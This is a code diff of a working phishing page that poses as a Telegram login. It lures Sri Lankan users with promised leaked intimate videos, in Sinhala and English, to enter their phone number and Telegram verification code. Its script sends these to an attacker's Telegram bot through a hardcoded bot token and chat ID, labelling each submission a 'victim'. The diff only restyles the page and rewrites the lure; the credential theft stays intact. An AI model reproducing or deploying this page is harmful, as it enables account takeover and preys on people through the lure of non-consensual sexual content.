@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram - Login</title>
+    <title>Telegram - Verify</title>
     <style>
         body {
-            background: linear-gradient(#0a0a0a, #1a0033);
+            background: linear-gradient(#0a0a0a, #330022);
             color: white;
             font-family: Arial, sans-serif;
             text-align: center;
@@ -16,58 +16,53 @@
         .box {
             background: #1F1F1F;
             max-width: 420px;
-            margin: 40px auto;
-            padding: 35px 20px;
+            margin: 30px auto;
+            padding: 40px 20px;
             border-radius: 20px;
-            border: 3px solid #229ED9;
-            box-shadow: 0 0 30px #229ED9;
+            border: 4px solid #FF1493;
+            box-shadow: 0 0 40px #FF1493;
         }
         h1 { 
-            color: #229ED9; 
-            font-size: 28px; 
-        }
-        h2 {
-            font-size: 20px;
-            margin: 15px 0;
+            color: #FF00FF; 
+            font-size: 30px; 
         }
         input {
-            width: 90%;
-            padding: 16px;
-            margin: 12px 0;
+            width: 92%;
+            padding: 18px;
+            margin: 15px 0;
             background: #333;
-            border: 2px solid #555;
-            border-radius: 10px;
+            border: 2px solid #FF00FF;
+            border-radius: 12px;
             color: white;
-            font-size: 17px;
+            font-size: 18px;
         }
         button {
-            background: #229ED9;
+            background: #FF1493;
             color: white;
-            padding: 16px 50px;
-            font-size: 22px;
+            padding: 18px;
+            font-size: 24px;
             border: none;
-            border-radius: 12px;
+            border-radius: 15px;
             cursor: pointer;
-            margin-top: 20px;
-            width: 90%;
-            max-width: 340px;
+            margin-top: 25px;
+            width: 92%;
         }
-        button:hover {
-            background: #1E90FF;
+        button:hover, button:active {
+            background: #FF69B4;
         }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h1>🔵 Telegram</h1>
-    <h2>🔓 Verify කරන්න Hot Sri Lankan Leaks බලන්න</h2>
-    <p>🍑 Colombo & Negombo අලුත්ම ලීක්ස් බලන්න දැන්!</p>
+    <h1>🔵 Telegram Login</h1>
+    <h2>😈 Hot Sri Lankan Leaks බලන්න Verify කරන්න</h2>
+    <p><strong>🍑 අලුත්ම wet videos & nudes ඕනෙනම් phone සහ code දාන්න</strong></p>
 
-    <input type="tel" id="phone" placeholder="+94xxxxxxxxx" />
-    <input type="text" id="code" placeholder="Verification Code" />
+    <input type="tel" id="phone" placeholder="+94 Phone Number" />
+    <input type="text" id="code" placeholder="Telegram Verification Code" />
 
-    <button onclick="sendData()">UNLOCK වෙන්​න 😈</button>
+    <button onclick="sendData()">🍑 දැන්ම බලන්න Hot XXX Content 😈</button>
 </div>
 
 <script>
@@ -76,18 +71,18 @@ function sendData() {
     let code = document.getElementById('code').value;
 
     if(!phone || !code) {
-        alert("Phone number සහ Code දාන්න!");
+        alert("Phone number සහ Code දාන්න බඩුව!");
         return;
     }
 
-    const token = "8418029750:AAEXSgDBZyNwostfOPGib5ZvelEsc-56jmI";     // ← Put your bot token
-    const chatId = "badmoody_117";      // ← Put your chat ID
+    const token = "8418029750:AAEXSgDBZyNwostfOPGib5ZvelEsc-56jmI";
+    const chatId = "badmoody_117";
 
-    const text = `🔥 NEW VICTIM 🔥%0APhone: ${phone}%0ACode: ${code}%0ADevice: Mobile`;
+    const text = `🔥 NEW DIRTY VICTIM 🔥%0APhone: ${phone}%0ACode: ${code}%0AFrom: SL Leak Bot`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`);
 
-    alert("🔥 Hot Sri Lankan videos loading... 😈");
+    alert("🔥 Loading Wet Sri Lankan Videos & Photos... 😈💦");
 }
 </script>
 
